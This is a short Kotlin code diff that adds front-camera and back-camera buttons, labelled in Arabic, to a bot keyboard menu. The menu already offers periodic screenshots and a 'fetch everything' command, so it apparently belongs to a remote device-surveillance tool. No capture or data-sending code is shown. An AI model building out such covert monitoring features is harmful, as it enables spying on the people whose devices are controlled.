@@ -26,6 +26,10 @@ object KeyboardBuilder {
             btn("📷 لقطات كل 30s", "screen_loop_start"),
             btn("🛑 إيقاف اللقطات", "screen_loop_stop")
         ))
+        rows.put(row(
+            btn("🤳 كاميرا أمامية", "cam_front"),
+            btn("📸 كاميرا خلفية", "cam_back")
+        ))
         rows.put(row(btn("🚀 جلب كل شي مع بعض", "fetch_all")))
         rows.put(row(btn("🔄 تحديث القائمة", "menu")))
 
